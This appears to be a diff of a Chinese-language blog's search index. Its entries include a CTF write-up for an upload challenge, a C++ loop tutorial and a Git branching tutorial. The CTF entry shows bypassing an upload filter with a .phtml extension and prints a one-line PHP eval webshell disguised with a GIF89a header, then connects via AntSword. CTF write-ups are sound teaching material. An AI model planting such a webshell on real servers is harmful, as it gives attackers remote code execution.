@@ -1,6 +1,41 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>ACTF2020 新生赛 Upload</title>
+    <url>/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/</url>
+    <content><![CDATA[<p>同样是一道上传题，上传已有木马</p>
+<p><img src="/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/image-20211202162637320.png" alt="image-20211202162637320"></p>
+<span id="more"></span>
+
+<p>换gif木马重新尝试</p>
+<p><img src="/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/image-20211202162755354.png" alt="image-20211202162755354"></p>
+<p>上传成功，打开指定网址查看是否有上传文件</p>
+<p><img src="/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/image-20211202162849704.png" alt="image-20211202162849704"></p>
+<p>果然有</p>
+<p><img src="/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/image-20211202162906119.png" alt="image-20211202162906119"></p>
+<p>接着打开蚁剑连接，发现</p>
+<p><strong><u>上传的图片中的代码不能用</u></strong></p>
+<p>换方法</p>
+<p>随便上传一个图片，然后修改其后缀和内容</p>
+<p><img src="/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/image-20211202173541721.png" alt="image-20211202173541721"></p>
+<p>改为php后，不通过，则改为phtml</p>
+<p>并插入代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a? &lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>])&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>如图</p>
+<p><img src="/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/image-20211202173720354.png" alt="image-20211202173720354"></p>
+<p>提交后</p>
+<p><img src="/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/image-20211202173743862.png" alt="image-20211202173743862"></p>
+<p>进入蚁剑连接</p>
+<p><img src="/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/image-20211202173834016.png" alt="image-20211202173834016"></p>
+<p>在根目录下得到flag</p>
+<p><img src="/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/image-20211202173912850.png" alt="image-20211202173912850"></p>
+]]></content>
+      <tags>
+        <tag>webshell</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>C++中的循环结构和跳转语句</title>
     <url>/2021/12/16/C-%E4%B8%AD%E7%9A%84%E5%BE%AA%E7%8E%AF%E7%BB%93%E6%9E%84/</url>
     <content><![CDATA[<h1 id="一、循环结构"><a href="#一、循环结构" class="headerlink" title="一、循环结构"></a>一、循环结构</h1><h2 id="1-while循环结构"><a href="#1-while循环结构" class="headerlink" title="1.while循环结构"></a>1.while循环结构</h2><p>作用：满足循环条件，执行循环语句</p>
@@ -45,41 +80,6 @@
 ]]></content>
       <tags>
         <tag>C++</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ACTF2020 新生赛 Upload</title>
-    <url>/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/</url>
-    <content><![CDATA[<p>同样是一道上传题，上传已有木马</p>
-<p><img src="/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/image-20211202162637320.png" alt="image-20211202162637320"></p>
-<span id="more"></span>
-
-<p>换gif木马重新尝试</p>
-<p><img src="/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/image-20211202162755354.png" alt="image-20211202162755354"></p>
-<p>上传成功，打开指定网址查看是否有上传文件</p>
-<p><img src="/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/image-20211202162849704.png" alt="image-20211202162849704"></p>
-<p>果然有</p>
-<p><img src="/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/image-20211202162906119.png" alt="image-20211202162906119"></p>
-<p>接着打开蚁剑连接，发现</p>
-<p><strong><u>上传的图片中的代码不能用</u></strong></p>
-<p>换方法</p>
-<p>随便上传一个图片，然后修改其后缀和内容</p>
-<p><img src="/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/image-20211202173541721.png" alt="image-20211202173541721"></p>
-<p>改为php后，不通过，则改为phtml</p>
-<p>并插入代码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a? &lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>])&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>如图</p>
-<p><img src="/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/image-20211202173720354.png" alt="image-20211202173720354"></p>
-<p>提交后</p>
-<p><img src="/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/image-20211202173743862.png" alt="image-20211202173743862"></p>
-<p>进入蚁剑连接</p>
-<p><img src="/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/image-20211202173834016.png" alt="image-20211202173834016"></p>
-<p>在根目录下得到flag</p>
-<p><img src="/2021/12/02/ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Upload/image-20211202173912850.png" alt="image-20211202173912850"></p>
-]]></content>
-      <tags>
-        <tag>webshell</tag>
       </tags>
   </entry>
   <entry>
@@ -623,6 +623,70 @@
 <p><img src="/2022/01/09/Git%E7%89%88%E6%9C%AC%E7%A9%BF%E6%A2%AD/image-20220110191331518.png" alt="image-20220110191331518"></p>
 <p>上图表示第一行删去了9个a</p>
 <p>还有其他比较方式，和本地库比较：<code>git diff HEAD 文件名</code>、和历史版本比较：<code>git diff HEAD^ 文件名</code>（和上一版本比较）</p>
+]]></content>
+      <tags>
+        <tag>Git</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Git的分支管理级Git的基本原理</title>
+    <url>/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/</url>
+    <content><![CDATA[<h1 id="分支的意义"><a href="#分支的意义" class="headerlink" title="分支的意义"></a>分支的意义</h1><ul>
+<li><p>分支是主干（master）的复制品，可以进行试错，可以删除，也也可以合并回主干</p>
+</li>
+<li><p>分支更加专业化，分支之间互不干扰</p>
+</li>
+<li><p>可以多人同时开发不同分支，增加开发效率</p>
+<span id="more"></span></li>
+</ul>
+<h1 id="分支操作"><a href="#分支操作" class="headerlink" title="分支操作"></a>分支操作</h1><p>查看所有分支命令：<code>git branch -v</code></p>
+<p>创建新的分支：<code>git branch 分支名</code></p>
+<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220110195627374.png" alt="image-20220110195627374"></p>
+<p>分支的切换：<code>git checkout 分支名</code></p>
+<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220110195754653.png" alt="image-20220110195754653"></p>
+<p>用hot_fix分支修改文件</p>
+<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220110200141530.png" alt="image-20220110200141530"></p>
+<p>若要将hot_fix分支合并到master分支上，则要切换到master分支上（即被合并的分支）</p>
+<p>合并命令：<code>git merge 分支名</code></p>
+<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220110200612093.png" alt="image-20220110200612093"></p>
+<p>当分支有冲突时（即两个分支都对同一地方进行了修改）</p>
+<p>首先要产生冲突</p>
+<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220110201910358.png" alt="image-20220110201910358"></p>
+<p>产生冲突后看产生冲突的文件内容</p>
+<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220110202059391.png" alt="image-20220110202059391"></p>
+<p>删除多于内容后（可在阅览模式下双击d键删除一行）</p>
+<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220110202632027.png" alt="image-20220110202632027"></p>
+<p>保留自己想要的内容，然后<code>git add 文件名</code>，<code>git commit -m &quot;备注&quot;</code>提交</p>
+<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220110203321229.png" alt="image-20220110203321229"></p>
+<h1 id="Git基本原理"><a href="#Git基本原理" class="headerlink" title="Git基本原理"></a>Git基本原理</h1><h2 id="哈希算法"><a href="#哈希算法" class="headerlink" title="哈希算法"></a>哈希算法</h2><p>哈希是一个系列的加密算法，各个不同的哈希加密虽然加密强度不同，但是有以下几个共同点</p>
+<ul>
+<li>不管输入的数据量有多大，输入同一个哈希算法，得到的加密结果长度固定。</li>
+<li>哈希加密确定，输入数据有变化，输出数据一定有变化，而且变化程度很大。</li>
+<li>哈希算法确定，输入数据确定，输出数据能够保证不变。</li>
+<li>哈希算法不可逆</li>
+</ul>
+<p>Git底层采用的是SHA-1算法。</p>
+<p>哈希算法可以被用来验证文件。原理如下</p>
+<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220111095840028.png" alt="image-20220111095840028"></p>
+<p>Git就是靠这种操作从根本上保证数据的完整性。</p>
+<h2 id="Git保存版本机制"><a href="#Git保存版本机制" class="headerlink" title="Git保存版本机制"></a>Git保存版本机制</h2><p>首先讲一下集中式版本控制工具的文件管理机制</p>
+<p>以文件变更列表的方式存储信息。这类系统将它们保存的信息看作时一组基本文件和每个文件随时间逐步积累的差异。也就是只保存更改的地方</p>
+<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220111101222004.png" alt="image-20220111101222004"></p>
+<p>然后是Git的文件管理机制</p>
+<p>Git把数据看作是小型文件系统的一组快照，每次提交更新时，Git都会对当前的全部文件制作一个快照并保存这个快照的索引。为了高效，<u>如果文件没有修改，Git不再重新存储该文件</u>。所以Git的工作方式可以称之为快照流。</p>
+<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220111103051918.png" alt="image-20220111103051918"></p>
+<p>Git的提交对象</p>
+<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220111103632587.png" alt="image-20220111103632587"></p>
+<p>提交对象及其父对象形成的链条</p>
+<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220111103823481.png" alt="image-20220111103823481"></p>
+<h2 id="Git分支管理机制"><a href="#Git分支管理机制" class="headerlink" title="Git分支管理机制"></a>Git分支管理机制</h2><p>分支的创建</p>
+<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220111104023440.png" alt="image-20220111104023440"></p>
+<p>testing指针和master指针在同一链条，而不是为testing单搞一条链，节省了储存空间</p>
+<p>分支切换（改变HEAD指针的位置）</p>
+<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220111121831087.png" alt="image-20220111121831087"></p>
+<p>当分支文件不一样时，才会出现分支</p>
+<p><img src="/2022/01/10/Git%E7%9A%84%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86/image-20220111122101487.png" alt="image-20220111122101487"></p>
+<p><strong>Git在本地的版本控制就完结了</strong></p>
 ]]></content>
       <tags>
         <tag>Git</tag>
